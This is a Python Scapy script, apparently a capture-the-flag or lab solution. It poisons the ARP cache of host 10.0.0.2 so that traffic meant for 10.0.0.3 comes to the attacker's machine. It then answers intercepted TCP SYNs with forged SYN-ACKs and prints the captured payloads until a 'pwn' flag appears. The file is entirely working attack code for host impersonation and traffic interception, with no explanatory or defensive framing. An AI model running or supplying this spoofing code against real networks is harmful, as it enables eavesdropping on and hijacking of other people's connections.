from scapy.all import *
import sys

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
HWSRC = get_if_hwaddr(conf.iface)
IS_AT = 2
PSRC = "10.0.0.3"
PDST = "10.0.0.2"
HWDST = getmacbyip(PDST)

def handle_syn(packet):
    packet.show()
    if TCP in packet and packet[TCP].flags == "S":
        ip = packet[IP]
        tcp = packet[TCP]

        synack = IP(src=ip.dst, dst=ip.src) / \
                 TCP(sport=tcp.dport, dport=tcp.sport,
                     flags="SA",
                     seq=tcp.seq + 1,
                     ack=tcp.seq + 1)

        send(synack)
    if Raw in packet:
        flag = packet[Raw].load.decode("utf-8")
        print(flag)
        if "pwn" in flag:
            sys.exit(0)

def send_arp():
    frame = Ether(dst=HWDST)
    packet_ = frame / ARP(psrc=PSRC, hwsrc=HWSRC, op=IS_AT, pdst=PDST)
    packet_.show()
    sendp(packet_)
    sniff(count=-1, prn=handle_syn)

def main():
    send_arp()
    return (0)

if __name__ == "__main__":
    main()